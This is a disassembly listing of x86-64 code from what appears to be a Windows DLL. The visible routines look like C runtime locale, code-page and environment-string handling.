   18000948e:	75 05                	jne    0x180009495
   180009490:	e8 6b 1b 00 00       	call   0x18000b000
   180009495:	48 8b 45 30          	mov    0x30(%rbp),%rax
   180009499:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   1800094a0:	83 c8 ff             	or     $0xffffffff,%eax
   1800094a3:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   1800094a7:	83 f8 01             	cmp    $0x1,%eax
   1800094aa:	75 1c                	jne    0x1800094c8
   1800094ac:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1800094b0:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   1800094b7:	48 8d 05 a2 0b 01 00 	lea    0x10ba2(%rip),%rax        # 0x18001a060
   1800094be:	48 3b c8             	cmp    %rax,%rcx
   1800094c1:	74 05                	je     0x1800094c8
   1800094c3:	e8 cc ed ff ff       	call   0x180008294
   1800094c8:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   1800094ce:	48 8b cb             	mov    %rbx,%rcx
   1800094d1:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1800094d5:	33 db                	xor    %ebx,%ebx
   1800094d7:	48 89 88 88 00 00 00 	mov    %rcx,0x88(%rax)
   1800094de:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1800094e2:	8b 88 a8 03 00 00    	mov    0x3a8(%rax),%ecx
   1800094e8:	85 0d 2a 13 01 00    	test   %ecx,0x1132a(%rip)        # 0x18001a818
   1800094ee:	75 84                	jne    0x180009474
   1800094f0:	48 8d 45 30          	lea    0x30(%rbp),%rax
   1800094f4:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1800094f8:	4c 8d 4d e4          	lea    -0x1c(%rbp),%r9
   1800094fc:	48 8d 45 38          	lea    0x38(%rbp),%rax
   180009500:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   180009504:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   180009508:	8d 43 05             	lea    0x5(%rbx),%eax
   18000950b:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
   18000950f:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   180009512:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   180009516:	89 45 e8             	mov    %eax,-0x18(%rbp)
   180009519:	e8 ae f9 ff ff       	call   0x180008ecc
   18000951e:	40 84 f6             	test   %sil,%sil
   180009521:	0f 84 4d ff ff ff    	je     0x180009474
   180009527:	48 8b 45 38          	mov    0x38(%rbp),%rax
   18000952b:	48 8b 08             	mov    (%rax),%rcx
   18000952e:	48 89 0d cb 11 01 00 	mov    %rcx,0x111cb(%rip)        # 0x18001a700
   180009535:	e9 3a ff ff ff       	jmp    0x180009474
   18000953a:	cc                   	int3
   18000953b:	cc                   	int3
   18000953c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180009541:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180009546:	57                   	push   %rdi
   180009547:	48 83 ec 20          	sub    $0x20,%rsp
   18000954b:	48 8b f2             	mov    %rdx,%rsi
   18000954e:	48 8b f9             	mov    %rcx,%rdi
   180009551:	8b 05 c1 12 01 00    	mov    0x112c1(%rip),%eax        # 0x18001a818
   180009557:	85 81 a8 03 00 00    	test   %eax,0x3a8(%rcx)
   18000955d:	74 13                	je     0x180009572
   18000955f:	48 83 b9 90 00 00 00 	cmpq   $0x0,0x90(%rcx)
   180009566:	00 
   180009567:	74 09                	je     0x180009572
   180009569:	48 8b 99 88 00 00 00 	mov    0x88(%rcx),%rbx
   180009570:	eb 64                	jmp    0x1800095d6
   180009572:	b9 05 00 00 00       	mov    $0x5,%ecx
   180009577:	e8 1c eb ff ff       	call   0x180008098
   18000957c:	90                   	nop
   18000957d:	48 8b 9f 88 00 00 00 	mov    0x88(%rdi),%rbx
   180009584:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   180009589:	48 3b 1e             	cmp    (%rsi),%rbx
   18000958c:	74 3e                	je     0x1800095cc
   18000958e:	48 85 db             	test   %rbx,%rbx
   180009591:	74 22                	je     0x1800095b5
   180009593:	83 c8 ff             	or     $0xffffffff,%eax
   180009596:	f0 0f c1 03          	lock xadd %eax,(%rbx)
   18000959a:	83 f8 01             	cmp    $0x1,%eax
   18000959d:	75 16                	jne    0x1800095b5
   18000959f:	48 8d 05 ba 0a 01 00 	lea    0x10aba(%rip),%rax        # 0x18001a060
   1800095a6:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1800095ab:	48 3b c8             	cmp    %rax,%rcx
   1800095ae:	74 05                	je     0x1800095b5
   1800095b0:	e8 df ec ff ff       	call   0x180008294
   1800095b5:	48 8b 06             	mov    (%rsi),%rax
   1800095b8:	48 89 87 88 00 00 00 	mov    %rax,0x88(%rdi)
   1800095bf:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1800095c4:	f0 ff 00             	lock incl (%rax)
   1800095c7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800095cc:	b9 05 00 00 00       	mov    $0x5,%ecx
   1800095d1:	e8 16 eb ff ff       	call   0x1800080ec
   1800095d6:	48 85 db             	test   %rbx,%rbx
   1800095d9:	74 13                	je     0x1800095ee
   1800095db:	48 8b c3             	mov    %rbx,%rax
   1800095de:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1800095e3:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1800095e8:	48 83 c4 20          	add    $0x20,%rsp
   1800095ec:	5f                   	pop    %rdi
   1800095ed:	c3                   	ret
   1800095ee:	e8 e1 e1 ff ff       	call   0x1800077d4
   1800095f3:	90                   	nop
   1800095f4:	48 83 ec 28          	sub    $0x28,%rsp
   1800095f8:	80 3d 35 20 01 00 00 	cmpb   $0x0,0x12035(%rip)        # 0x18001b634
   1800095ff:	75 4c                	jne    0x18000964d
   180009601:	48 8d 0d 98 0d 01 00 	lea    0x10d98(%rip),%rcx        # 0x18001a3a0
   180009608:	48 89 0d 11 20 01 00 	mov    %rcx,0x12011(%rip)        # 0x18001b620
   18000960f:	48 8d 05 4a 0a 01 00 	lea    0x10a4a(%rip),%rax        # 0x18001a060
   180009616:	48 8d 0d 73 0c 01 00 	lea    0x10c73(%rip),%rcx        # 0x18001a290
   18000961d:	48 89 05 04 20 01 00 	mov    %rax,0x12004(%rip)        # 0x18001b628
   180009624:	48 89 0d ed 1f 01 00 	mov    %rcx,0x11fed(%rip)        # 0x18001b618
   18000962b:	e8 4c e8 ff ff       	call   0x180007e7c
   180009630:	4c 8d 0d f1 1f 01 00 	lea    0x11ff1(%rip),%r9        # 0x18001b628
   180009637:	4c 8b c0             	mov    %rax,%r8
   18000963a:	b2 01                	mov    $0x1,%dl
   18000963c:	b9 fd ff ff ff       	mov    $0xfffffffd,%ecx
   180009641:	e8 36 fd ff ff       	call   0x18000937c
   180009646:	c6 05 e7 1f 01 00 01 	movb   $0x1,0x11fe7(%rip)        # 0x18001b634
   18000964d:	b0 01                	mov    $0x1,%al
   18000964f:	48 83 c4 28          	add    $0x28,%rsp
   180009653:	c3                   	ret
   180009654:	48 83 ec 28          	sub    $0x28,%rsp
   180009658:	e8 4b e7 ff ff       	call   0x180007da8
   18000965d:	48 8b c8             	mov    %rax,%rcx
   180009660:	48 8d 15 c1 1f 01 00 	lea    0x11fc1(%rip),%rdx        # 0x18001b628
   180009667:	48 83 c4 28          	add    $0x28,%rsp
   18000966b:	e9 cc fe ff ff       	jmp    0x18000953c
   180009670:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180009675:	55                   	push   %rbp
   180009676:	56                   	push   %rsi
   180009677:	57                   	push   %rdi
   180009678:	41 54                	push   %r12
   18000967a:	41 55                	push   %r13
   18000967c:	41 56                	push   %r14
   18000967e:	41 57                	push   %r15
   180009680:	48 83 ec 40          	sub    $0x40,%rsp
   180009684:	48 8b 05 85 09 01 00 	mov    0x10985(%rip),%rax        # 0x18001a010
   18000968b:	48 33 c4             	xor    %rsp,%rax
   18000968e:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180009693:	48 8b f2             	mov    %rdx,%rsi
   180009696:	e8 ed f9 ff ff       	call   0x180009088
   18000969b:	33 db                	xor    %ebx,%ebx
   18000969d:	8b f8                	mov    %eax,%edi
   18000969f:	85 c0                	test   %eax,%eax
   1800096a1:	0f 84 53 02 00 00    	je     0x1800098fa
   1800096a7:	4c 8d 2d 02 0e 01 00 	lea    0x10e02(%rip),%r13        # 0x18001a4b0
   1800096ae:	44 8b f3             	mov    %ebx,%r14d
   1800096b1:	49 8b c5             	mov    %r13,%rax
   1800096b4:	8d 6b 01             	lea    0x1(%rbx),%ebp
   1800096b7:	39 38                	cmp    %edi,(%rax)
   1800096b9:	0f 84 4e 01 00 00    	je     0x18000980d
   1800096bf:	44 03 f5             	add    %ebp,%r14d
   1800096c2:	48 83 c0 30          	add    $0x30,%rax
   1800096c6:	41 83 fe 05          	cmp    $0x5,%r14d
   1800096ca:	72 eb                	jb     0x1800096b7
   1800096cc:	81 ff e8 fd 00 00    	cmp    $0xfde8,%edi
   1800096d2:	0f 84 2d 01 00 00    	je     0x180009805
   1800096d8:	0f b7 cf             	movzwl %di,%ecx
   1800096db:	ff 15 8f 6a 00 00    	call   *0x6a8f(%rip)        # 0x180010170
   1800096e1:	85 c0                	test   %eax,%eax
   1800096e3:	0f 84 1c 01 00 00    	je     0x180009805
   1800096e9:	b8 e9 fd 00 00       	mov    $0xfde9,%eax
   1800096ee:	3b f8                	cmp    %eax,%edi
   1800096f0:	75 2e                	jne    0x180009720
   1800096f2:	48 89 46 04          	mov    %rax,0x4(%rsi)
   1800096f6:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   1800096fd:	89 5e 18             	mov    %ebx,0x18(%rsi)
   180009700:	66 89 5e 1c          	mov    %bx,0x1c(%rsi)
   180009704:	48 8d 7e 0c          	lea    0xc(%rsi),%rdi
   180009708:	0f b7 c3             	movzwl %bx,%eax
   18000970b:	b9 06 00 00 00       	mov    $0x6,%ecx
   180009710:	66 f3 ab             	rep stos %ax,(%rdi)
   180009713:	48 8b ce             	mov    %rsi,%rcx
   180009716:	e8 7d fa ff ff       	call   0x180009198
   18000971b:	e9 e2 01 00 00       	jmp    0x180009902
   180009720:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   180009725:	8b cf                	mov    %edi,%ecx
   180009727:	ff 15 5b 6a 00 00    	call   *0x6a5b(%rip)        # 0x180010188
   18000972d:	85 c0                	test   %eax,%eax
   18000972f:	0f 84 c4 00 00 00    	je     0x1800097f9
   180009735:	33 d2                	xor    %edx,%edx
   180009737:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   18000973b:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   180009741:	e8 3a 9f ff ff       	call   0x180003680
   180009746:	83 7c 24 20 02       	cmpl   $0x2,0x20(%rsp)
   18000974b:	89 7e 04             	mov    %edi,0x4(%rsi)
   18000974e:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   180009755:	0f 85 94 00 00 00    	jne    0x1800097ef
   18000975b:	48 8d 4c 24 26       	lea    0x26(%rsp),%rcx
   180009760:	38 5c 24 26          	cmp    %bl,0x26(%rsp)
   180009764:	74 2c                	je     0x180009792
   180009766:	38 59 01             	cmp    %bl,0x1(%rcx)
   180009769:	74 27                	je     0x180009792
   18000976b:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   18000976f:	0f b6 11             	movzbl (%rcx),%edx
   180009772:	3b d0                	cmp    %eax,%edx
   180009774:	77 14                	ja     0x18000978a
   180009776:	2b c2                	sub    %edx,%eax
   180009778:	8d 7a 01             	lea    0x1(%rdx),%edi
   18000977b:	8d 14 28             	lea    (%rax,%rbp,1),%edx
   18000977e:	80 4c 37 18 04       	orb    $0x4,0x18(%rdi,%rsi,1)
   180009783:	03 fd                	add    %ebp,%edi
   180009785:	48 2b d5             	sub    %rbp,%rdx
   180009788:	75 f4                	jne    0x18000977e
   18000978a:	48 83 c1 02          	add    $0x2,%rcx
   18000978e:	38 19                	cmp    %bl,(%rcx)
   180009790:	75 d4                	jne    0x180009766
   180009792:	48 8d 46 1a          	lea    0x1a(%rsi),%rax
   180009796:	b9 fe 00 00 00       	mov    $0xfe,%ecx
   18000979b:	80 08 08             	orb    $0x8,(%rax)
   18000979e:	48 03 c5             	add    %rbp,%rax
   1800097a1:	48 2b cd             	sub    %rbp,%rcx
   1800097a4:	75 f5                	jne    0x18000979b
   1800097a6:	8b 4e 04             	mov    0x4(%rsi),%ecx
   1800097a9:	81 e9 a4 03 00 00    	sub    $0x3a4,%ecx
   1800097af:	74 2e                	je     0x1800097df
   1800097b1:	83 e9 04             	sub    $0x4,%ecx
   1800097b4:	74 20                	je     0x1800097d6
   1800097b6:	83 e9 0d             	sub    $0xd,%ecx
   1800097b9:	74 12                	je     0x1800097cd
   1800097bb:	3b cd                	cmp    %ebp,%ecx
   1800097bd:	74 05                	je     0x1800097c4
   1800097bf:	48 8b c3             	mov    %rbx,%rax
   1800097c2:	eb 22                	jmp    0x1800097e6
   1800097c4:	48 8b 05 65 7f 00 00 	mov    0x7f65(%rip),%rax        # 0x180011730
   1800097cb:	eb 19                	jmp    0x1800097e6
   1800097cd:	48 8b 05 54 7f 00 00 	mov    0x7f54(%rip),%rax        # 0x180011728
   1800097d4:	eb 10                	jmp    0x1800097e6
   1800097d6:	48 8b 05 43 7f 00 00 	mov    0x7f43(%rip),%rax        # 0x180011720
   1800097dd:	eb 07                	jmp    0x1800097e6
   1800097df:	48 8b 05 32 7f 00 00 	mov    0x7f32(%rip),%rax        # 0x180011718
   1800097e6:	48 89 86 20 02 00 00 	mov    %rax,0x220(%rsi)
   1800097ed:	eb 02                	jmp    0x1800097f1
   1800097ef:	8b eb                	mov    %ebx,%ebp
   1800097f1:	89 6e 08             	mov    %ebp,0x8(%rsi)
   1800097f4:	e9 0b ff ff ff       	jmp    0x180009704
   1800097f9:	39 1d 31 1e 01 00    	cmp    %ebx,0x11e31(%rip)        # 0x18001b630
   1800097ff:	0f 85 f5 00 00 00    	jne    0x1800098fa
   180009805:	83 c8 ff             	or     $0xffffffff,%eax
   180009808:	e9 f7 00 00 00       	jmp    0x180009904
   18000980d:	33 d2                	xor    %edx,%edx
   18000980f:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   180009813:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   180009819:	e8 62 9e ff ff       	call   0x180003680
   18000981e:	41 8b c6             	mov    %r14d,%eax
   180009821:	4d 8d 4d 10          	lea    0x10(%r13),%r9
   180009825:	4c 8d 3d 74 0c 01 00 	lea    0x10c74(%rip),%r15        # 0x18001a4a0
   18000982c:	41 be 04 00 00 00    	mov    $0x4,%r14d
   180009832:	4c 8d 1c 40          	lea    (%rax,%rax,2),%r11
   180009836:	49 c1 e3 04          	shl    $0x4,%r11
   18000983a:	4d 03 cb             	add    %r11,%r9
   18000983d:	49 8b d1             	mov    %r9,%rdx
   180009840:	41 38 19             	cmp    %bl,(%r9)
   180009843:	74 3e                	je     0x180009883
   180009845:	38 5a 01             	cmp    %bl,0x1(%rdx)
   180009848:	74 39                	je     0x180009883
   18000984a:	44 0f b6 02          	movzbl (%rdx),%r8d
   18000984e:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   180009852:	44 3b c0             	cmp    %eax,%r8d
   180009855:	77 24                	ja     0x18000987b
   180009857:	45 8d 50 01          	lea    0x1(%r8),%r10d
   18000985b:	41 81 fa 01 01 00 00 	cmp    $0x101,%r10d
   180009862:	73 17                	jae    0x18000987b
   180009864:	41 8a 07             	mov    (%r15),%al
   180009867:	44 03 c5             	add    %ebp,%r8d
   18000986a:	41 08 44 32 18       	or     %al,0x18(%r10,%rsi,1)
   18000986f:	44 03 d5             	add    %ebp,%r10d
   180009872:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   180009876:	44 3b c0             	cmp    %eax,%r8d
   180009879:	76 e0                	jbe    0x18000985b
   18000987b:	48 83 c2 02          	add    $0x2,%rdx
   18000987f:	38 1a                	cmp    %bl,(%rdx)
   180009881:	75 c2                	jne    0x180009845
   180009883:	49 83 c1 08          	add    $0x8,%r9
   180009887:	4c 03 fd             	add    %rbp,%r15
   18000988a:	4c 2b f5             	sub    %rbp,%r14
   18000988d:	75 ae                	jne    0x18000983d
   18000988f:	89 7e 04             	mov    %edi,0x4(%rsi)
   180009892:	89 6e 08             	mov    %ebp,0x8(%rsi)
   180009895:	81 ef a4 03 00 00    	sub    $0x3a4,%edi
   18000989b:	74 29                	je     0x1800098c6
   18000989d:	83 ef 04             	sub    $0x4,%edi
   1800098a0:	74 1b                	je     0x1800098bd
   1800098a2:	83 ef 0d             	sub    $0xd,%edi
   1800098a5:	74 0d                	je     0x1800098b4
   1800098a7:	3b fd                	cmp    %ebp,%edi
   1800098a9:	75 22                	jne    0x1800098cd
   1800098ab:	48 8b 1d 7e 7e 00 00 	mov    0x7e7e(%rip),%rbx        # 0x180011730
   1800098b2:	eb 19                	jmp    0x1800098cd
   1800098b4:	48 8b 1d 6d 7e 00 00 	mov    0x7e6d(%rip),%rbx        # 0x180011728
   1800098bb:	eb 10                	jmp    0x1800098cd
   1800098bd:	48 8b 1d 5c 7e 00 00 	mov    0x7e5c(%rip),%rbx        # 0x180011720
   1800098c4:	eb 07                	jmp    0x1800098cd
   1800098c6:	48 8b 1d 4b 7e 00 00 	mov    0x7e4b(%rip),%rbx        # 0x180011718
   1800098cd:	4c 2b de             	sub    %rsi,%r11
   1800098d0:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   1800098d7:	48 8d 56 0c          	lea    0xc(%rsi),%rdx
   1800098db:	b9 06 00 00 00       	mov    $0x6,%ecx
   1800098e0:	4b 8d 3c 2b          	lea    (%r11,%r13,1),%rdi
   1800098e4:	0f b7 44 17 f8       	movzwl -0x8(%rdi,%rdx,1),%eax
   1800098e9:	66 89 02             	mov    %ax,(%rdx)
   1800098ec:	48 8d 52 02          	lea    0x2(%rdx),%rdx
   1800098f0:	48 2b cd             	sub    %rbp,%rcx
   1800098f3:	75 ef                	jne    0x1800098e4
   1800098f5:	e9 19 fe ff ff       	jmp    0x180009713
   1800098fa:	48 8b ce             	mov    %rsi,%rcx
   1800098fd:	e8 06 f8 ff ff       	call   0x180009108
   180009902:	33 c0                	xor    %eax,%eax
   180009904:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   180009909:	48 33 cc             	xor    %rsp,%rcx
   18000990c:	e8 af 81 ff ff       	call   0x180001ac0
   180009911:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   180009918:	00 
   180009919:	48 83 c4 40          	add    $0x40,%rsp
   18000991d:	41 5f                	pop    %r15
   18000991f:	41 5e                	pop    %r14
   180009921:	41 5d                	pop    %r13
   180009923:	41 5c                	pop    %r12
   180009925:	5f                   	pop    %rdi
   180009926:	5e                   	pop    %rsi
   180009927:	5d                   	pop    %rbp
   180009928:	c3                   	ret
   180009929:	cc                   	int3
   18000992a:	cc                   	int3
   18000992b:	cc                   	int3
   18000992c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180009931:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180009936:	57                   	push   %rdi
   180009937:	48 83 ec 40          	sub    $0x40,%rsp
   18000993b:	8b da                	mov    %edx,%ebx
   18000993d:	41 8b f9             	mov    %r9d,%edi
   180009940:	48 8b d1             	mov    %rcx,%rdx
   180009943:	41 8b f0             	mov    %r8d,%esi
   180009946:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000994b:	e8 44 df ff ff       	call   0x180007894
   180009950:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   180009955:	0f b6 d3             	movzbl %bl,%edx
   180009958:	40 84 7c 02 19       	test   %dil,0x19(%rdx,%rax,1)
   18000995d:	75 1a                	jne    0x180009979
   18000995f:	85 f6                	test   %esi,%esi
   180009961:	74 10                	je     0x180009973
   180009963:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   180009968:	48 8b 08             	mov    (%rax),%rcx
   18000996b:	0f b7 04 51          	movzwl (%rcx,%rdx,2),%eax
   18000996f:	23 c6                	and    %esi,%eax
   180009971:	eb 02                	jmp    0x180009975
   180009973:	33 c0                	xor    %eax,%eax
   180009975:	85 c0                	test   %eax,%eax
   180009977:	74 05                	je     0x18000997e
   180009979:	b8 01 00 00 00       	mov    $0x1,%eax
   18000997e:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   180009983:	74 0c                	je     0x180009991
   180009985:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   18000998a:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   180009991:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180009996:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   18000999b:	48 83 c4 40          	add    $0x40,%rsp
   18000999f:	5f                   	pop    %rdi
   1800099a0:	c3                   	ret
   1800099a1:	cc                   	int3
   1800099a2:	cc                   	int3
   1800099a3:	cc                   	int3
   1800099a4:	8b d1                	mov    %ecx,%edx
   1800099a6:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   1800099ac:	33 c9                	xor    %ecx,%ecx
   1800099ae:	45 33 c0             	xor    %r8d,%r8d
   1800099b1:	e9 76 ff ff ff       	jmp    0x18000992c
   1800099b6:	cc                   	int3
   1800099b7:	cc                   	int3
   1800099b8:	48 83 ec 28          	sub    $0x28,%rsp
   1800099bc:	ff 15 ce 67 00 00    	call   *0x67ce(%rip)        # 0x180010190
   1800099c2:	48 89 05 8f 1c 01 00 	mov    %rax,0x11c8f(%rip)        # 0x18001b658
   1800099c9:	ff 15 c9 67 00 00    	call   *0x67c9(%rip)        # 0x180010198
   1800099cf:	48 89 05 8a 1c 01 00 	mov    %rax,0x11c8a(%rip)        # 0x18001b660
   1800099d6:	b0 01                	mov    $0x1,%al
   1800099d8:	48 83 c4 28          	add    $0x28,%rsp
   1800099dc:	c3                   	ret
   1800099dd:	cc                   	int3
   1800099de:	cc                   	int3
   1800099df:	cc                   	int3
   1800099e0:	81 f9 35 c4 00 00    	cmp    $0xc435,%ecx
   1800099e6:	77 20                	ja     0x180009a08
   1800099e8:	8d 81 d4 3b ff ff    	lea    -0xc42c(%rcx),%eax
   1800099ee:	83 f8 09             	cmp    $0x9,%eax
   1800099f1:	77 0c                	ja     0x1800099ff
   1800099f3:	41 ba a7 02 00 00    	mov    $0x2a7,%r10d
   1800099f9:	41 0f a3 c2          	bt     %eax,%r10d
   1800099fd:	72 05                	jb     0x180009a04
   1800099ff:	83 f9 2a             	cmp    $0x2a,%ecx
   180009a02:	75 2f                	jne    0x180009a33
   180009a04:	33 d2                	xor    %edx,%edx
   180009a06:	eb 2b                	jmp    0x180009a33
   180009a08:	81 f9 98 d6 00 00    	cmp    $0xd698,%ecx
   180009a0e:	74 20                	je     0x180009a30
   180009a10:	81 f9 a9 de 00 00    	cmp    $0xdea9,%ecx
   180009a16:	76 1b                	jbe    0x180009a33
   180009a18:	81 f9 b3 de 00 00    	cmp    $0xdeb3,%ecx
   180009a1e:	76 e4                	jbe    0x180009a04
   180009a20:	81 f9 e8 fd 00 00    	cmp    $0xfde8,%ecx
   180009a26:	74 dc                	je     0x180009a04
   180009a28:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   180009a2e:	75 03                	jne    0x180009a33
   180009a30:	83 e2 08             	and    $0x8,%edx
   180009a33:	48 ff 25 66 67 00 00 	rex.W jmp *0x6766(%rip)        # 0x1800101a0
   180009a3a:	cc                   	int3
   180009a3b:	cc                   	int3
   180009a3c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180009a41:	57                   	push   %rdi
   180009a42:	8d 81 18 02 ff ff    	lea    -0xfde8(%rcx),%eax
   180009a48:	45 8b d9             	mov    %r9d,%r11d
   180009a4b:	83 f8 01             	cmp    $0x1,%eax
   180009a4e:	49 8b d8             	mov    %r8,%rbx
   180009a51:	41 0f 96 c2          	setbe  %r10b
   180009a55:	33 ff                	xor    %edi,%edi
   180009a57:	81 f9 35 c4 00 00    	cmp    $0xc435,%ecx
   180009a5d:	77 1c                	ja     0x180009a7b
   180009a5f:	8d 81 d4 3b ff ff    	lea    -0xc42c(%rcx),%eax
   180009a65:	83 f8 09             	cmp    $0x9,%eax
   180009a68:	77 0c                	ja     0x180009a76
   180009a6a:	41 b8 a7 02 00 00    	mov    $0x2a7,%r8d
   180009a70:	41 0f a3 c0          	bt     %eax,%r8d
   180009a74:	72 33                	jb     0x180009aa9
   180009a76:	83 f9 2a             	cmp    $0x2a,%ecx
   180009a79:	eb 26                	jmp    0x180009aa1
   180009a7b:	81 f9 98 d6 00 00    	cmp    $0xd698,%ecx
   180009a81:	74 26                	je     0x180009aa9
   180009a83:	81 f9 a9 de 00 00    	cmp    $0xdea9,%ecx
   180009a89:	76 18                	jbe    0x180009aa3
   180009a8b:	81 f9 b3 de 00 00    	cmp    $0xdeb3,%ecx
   180009a91:	76 16                	jbe    0x180009aa9
   180009a93:	81 f9 e8 fd 00 00    	cmp    $0xfde8,%ecx
   180009a99:	74 0e                	je     0x180009aa9
   180009a9b:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   180009aa1:	74 06                	je     0x180009aa9
   180009aa3:	0f ba f2 07          	btr    $0x7,%edx
   180009aa7:	eb 02                	jmp    0x180009aab
   180009aa9:	8b d7                	mov    %edi,%edx
   180009aab:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   180009ab0:	45 84 d2             	test   %r10b,%r10b
   180009ab3:	4c 8b 4c 24 40       	mov    0x40(%rsp),%r9
   180009ab8:	4c 8b c0             	mov    %rax,%r8
   180009abb:	4c 0f 45 c7          	cmovne %rdi,%r8
   180009abf:	4c 0f 45 cf          	cmovne %rdi,%r9
   180009ac3:	74 07                	je     0x180009acc
   180009ac5:	48 85 c0             	test   %rax,%rax
   180009ac8:	74 02                	je     0x180009acc
   180009aca:	89 38                	mov    %edi,(%rax)
   180009acc:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
   180009ad1:	4c 8b c3             	mov    %rbx,%r8
   180009ad4:	4c 89 4c 24 40       	mov    %r9,0x40(%rsp)
   180009ad9:	45 8b cb             	mov    %r11d,%r9d
   180009adc:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   180009ae1:	5f                   	pop    %rdi
   180009ae2:	48 ff 25 bf 66 00 00 	rex.W jmp *0x66bf(%rip)        # 0x1800101a8
   180009ae9:	cc                   	int3
   180009aea:	cc                   	int3
   180009aeb:	cc                   	int3
   180009aec:	48 8b c4             	mov    %rsp,%rax
   180009aef:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180009af3:	48 89 68 10          	mov    %rbp,0x10(%rax)
   180009af7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180009afb:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180009aff:	41 56                	push   %r14
   180009b01:	48 83 ec 40          	sub    $0x40,%rsp
   180009b05:	ff 15 a5 66 00 00    	call   *0x66a5(%rip)        # 0x1800101b0
   180009b0b:	45 33 f6             	xor    %r14d,%r14d
   180009b0e:	48 8b d8             	mov    %rax,%rbx
   180009b11:	48 85 c0             	test   %rax,%rax
   180009b14:	0f 84 a4 00 00 00    	je     0x180009bbe
   180009b1a:	48 8b f0             	mov    %rax,%rsi
   180009b1d:	66 44 39 30          	cmp    %r14w,(%rax)
   180009b21:	74 1c                	je     0x180009b3f
   180009b23:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   180009b27:	48 ff c0             	inc    %rax
   180009b2a:	66 44 39 34 46       	cmp    %r14w,(%rsi,%rax,2)
   180009b2f:	75 f6                	jne    0x180009b27
   180009b31:	48 8d 34 46          	lea    (%rsi,%rax,2),%rsi
   180009b35:	48 83 c6 02          	add    $0x2,%rsi
   180009b39:	66 44 39 36          	cmp    %r14w,(%rsi)
   180009b3d:	75 e4                	jne    0x180009b23
   180009b3f:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   180009b44:	48 2b f3             	sub    %rbx,%rsi
   180009b47:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   180009b4c:	48 83 c6 02          	add    $0x2,%rsi
   180009b50:	48 d1 fe             	sar    $1,%rsi
   180009b53:	4c 8b c3             	mov    %rbx,%r8
   180009b56:	44 8b ce             	mov    %esi,%r9d
   180009b59:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   180009b5e:	33 d2                	xor    %edx,%edx
   180009b60:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   180009b65:	33 c9                	xor    %ecx,%ecx
   180009b67:	e8 d0 fe ff ff       	call   0x180009a3c
   180009b6c:	48 63 e8             	movslq %eax,%rbp
   180009b6f:	85 c0                	test   %eax,%eax
   180009b71:	74 4b                	je     0x180009bbe
   180009b73:	48 8b cd             	mov    %rbp,%rcx
   180009b76:	e8 9d 11 00 00       	call   0x18000ad18
   180009b7b:	48 8b f8             	mov    %rax,%rdi
   180009b7e:	48 85 c0             	test   %rax,%rax
   180009b81:	74 2e                	je     0x180009bb1
   180009b83:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   180009b88:	44 8b ce             	mov    %esi,%r9d
   180009b8b:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   180009b90:	4c 8b c3             	mov    %rbx,%r8
   180009b93:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   180009b97:	33 d2                	xor    %edx,%edx
   180009b99:	33 c9                	xor    %ecx,%ecx
   180009b9b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
